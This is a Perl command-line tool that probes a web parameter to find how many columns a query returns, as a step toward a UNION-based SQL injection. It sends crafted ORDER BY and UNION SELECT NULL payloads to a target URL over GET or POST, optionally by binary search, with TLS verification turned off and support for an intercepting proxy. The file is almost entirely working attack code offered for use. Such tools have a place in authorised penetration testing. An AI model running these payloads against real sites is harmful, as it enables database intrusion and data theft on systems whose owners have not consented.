#!/usr/bin/env perl
#
#   Author: <wexe1@protonmail.com>
#   License: MIT
#
use strict;
use warnings;
use LWP::UserAgent;
use Getopt::Long;
use feature 'say';

our (
    $method,    # GET/POST
    $paramName,
    $maxTries,
    $targetURL,
    $proxy,
    $null,
    $help,
    $binSearch,
    $oracle,

    $amountOfColums
);

print "Determining number of columns for UNION based SQL injection\n";

GetOptions(
    'method=s'      => \$method,
    'param=s'       => \$paramName,
    'max=i'         => \$maxTries,
    'url=s'         => \$targetURL,
    'proxy=s'       => \$proxy,
    'null'          => \$null,
    'h|help'        => \$help,
    'bin-search'    => \$binSearch,
    'oracle'        => \$oracle
);

&help() if $help;

die "You must specify the target url\nuse option -h for help\n" unless $targetURL;
die "You must specify the HTTP parameter name\nuse option -h for help\n" unless $paramName;

unless ($method) {
    $method = 'GET';
} else {
    die "Method must be GET or POST\n" unless $method =~ /GET|POST/i;
    $method = uc $method;
}

$maxTries = 10 unless $maxTries;

die "max must be a positive value\n" if $maxTries < 1;

our $ua = LWP::UserAgent->new(protocols_allowed => ['http', 'https']);
$ua->ssl_opts(verify_hostname => 0, SSL_verify_mode => 0x00);

# WARNING: install LWP::Protocol::connect if you want to use HTTPS proxy
# https://stackoverflow.com/questions/12116244/https-proxy-and-lwpuseragent/17787133#17787133
if ($proxy) {
    if ($proxy =~ /^https:\/\//) {
        $proxy =~ s/^https/connect/;
        $ua->proxy('https' => $proxy);
    } else {
        $ua->proxy('http' => $proxy);
    }
}

say "Trying to obtain amount of columns...";

if ($null) {
    for my $i (1..$maxTries) {
        my $payload = &nullVariantPayload($i);
        my $result = &sendRequest($payload);
        if ($result && $result != -1) {
            $amountOfColums = $i;
            last;
        }
    }
} else {
    if ($binSearch) {
        my @nums = (1..$maxTries + 1);
        my %previousQuery = (res => -1, num => -1);
        my ($begin, $end) = (0, $#nums);
        while ($begin <= $end) {
            my $middle = int(($begin + $end) / 2);
            my $payload = &orderByVariantPayload($nums[$middle]);
            my $result = &sendRequest($payload);

            if ($previousQuery{res} != -1 && abs($middle - $previousQuery{num}) == 1) {
                if ($result == 0 && $previousQuery{res} == 1) {
                    $amountOfColums = $nums[$previousQuery{num}];
                    last;
                }
            }

            if ($result == 1 && ($end - $begin) == 1) {
                if (&sendRequest(&orderByVariantPayload($nums[$middle + 1])) == 0) {
                    $amountOfColums = $nums[$previousQuery{num}];
                    last;
                }
            }

            if ($result == 1) {
                $begin = $middle;
            } elsif (!$result) {
                $end = $middle;
            }

            last if $previousQuery{num} == $middle;

            $previousQuery{res} = $result;
            $previousQuery{num} = $middle;
        }
    } else {
        for my $i (1..$maxTries) {
            my $payload = &orderByVariantPayload($i);
            my $result = &sendRequest($payload);
            if (!$result && $result != -1) {
                $amountOfColums = $i - 1;
                last;
            }
        }
    }
}

if ($amountOfColums) {
    say "Amount of columns: $amountOfColums";
} else {
    say "Couldn't find Number of columns :(";
}

sub sendRequest {
    my $payload = shift;
    
    my $res;
    if ($method eq "GET") {
        $res = $ua->get("$targetURL?$paramName=$payload");
    } elsif ($method eq "POST") {
        $res = $ua->post($targetURL, {$paramName => $payload});
    }

    if ($res->is_success) {
        return 1;
    } elsif ($res->decoded_content =~ /internal server error/ig) {
        return 0;
    } else {
        print STDERR $res->status_line, "\n";
        return -1;
    }
}

sub nullVariantPayload {
    my $num = shift;
    my $payload = "' union select " . ($num > 1 ? "null, " x ($num-1) : "") . "null";
    $payload .= " from dual" if $oracle;
    $payload .= " -- -";
    return $payload;
}

sub orderByVariantPayload {
    my $num = shift;
    return "' order by $num -- -";
}

sub help {
    print "\t--url=<target URL>\turl for site that we're testing\n";
    print "\t--param=<param name>\tparameter name in which we have found SQLi\n";
    print "\t--max=<number>\t\tmax number of columns we're checking (default 10)\n";
    print "\t--proxy=<proxy URL>\tie. Burp Suite\n";
    print "\t--null\t\t\tif you want to use NULL based method (default - using ORDER BY)\n";
    print "\t--bin-search\t\tif you want to use binary search (using ORDER BY only)\n";
    print "\t--oracle\t\tif you work with Oracle DB and want to use NULL based variant\n";
    exit;
}
